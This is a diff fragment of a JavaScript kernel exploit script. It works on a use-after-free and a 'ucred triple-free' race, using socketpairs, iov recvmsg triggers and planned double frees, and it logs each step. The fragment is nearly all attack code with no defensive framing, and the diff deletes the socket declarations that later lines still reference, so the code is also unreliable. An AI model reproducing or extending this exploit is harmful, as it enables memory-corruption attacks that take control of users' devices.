@@ -1416,17 +1416,6 @@ function remove_uaf_file() {
   }
 }
 
-var uio_sv = malloc(8);
-socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sv);
-
-var uio_sock_0 = read32(uio_sv);
-var uio_sock_1 = read32(uio_sv + 4);
-
-var iov_sv = malloc(8);
-socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sv);
-
-var iov_sock_0 = read32(iov_sv);
-var iov_sock_1 = read32(iov_sv + 4);
 
 var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 8;
 var TRIPLEFREE_REFCOUNT_MAX_WAIT = 1000;
@@ -1496,7 +1485,7 @@ function trigger_ucred_triplefree() {
       send_notification("step 6: loop i=" + i + " BEFORE trigger_iov_recvmsg");
       trigger_iov_recvmsg();
 
-      var w = write(iov_sock_1, tmp, 1);
+      var w = write(new BigInt(iov_sock_1), tmp, 1);
       send_notification(
         "step 6: loop i=" + i +
         " AFTER write: fd=" + iov_sock_1 +
@@ -1506,7 +1495,7 @@ function trigger_ucred_triplefree() {
       wait_iov_recvmsg();
       send_notification("step 6: loop i=" + i + " AFTER wait_iov_recvmsg");
 
-      var r = read(iov_sock_0, tmp, 1);
+      var r = read(new BigInt(iov_sock_0), tmp, 1);
       // لو عندك read8(tmp) أو ما شابه تقدر تستخدمه هنا
       send_notification(
         "step 6: loop i=" + i +
@@ -1514,7 +1503,7 @@ function trigger_ucred_triplefree() {
         ", read_ret=" + r
       );
     }
-
+    
     send_notification("step 6: done");
 
     // 7) double free أول مرة
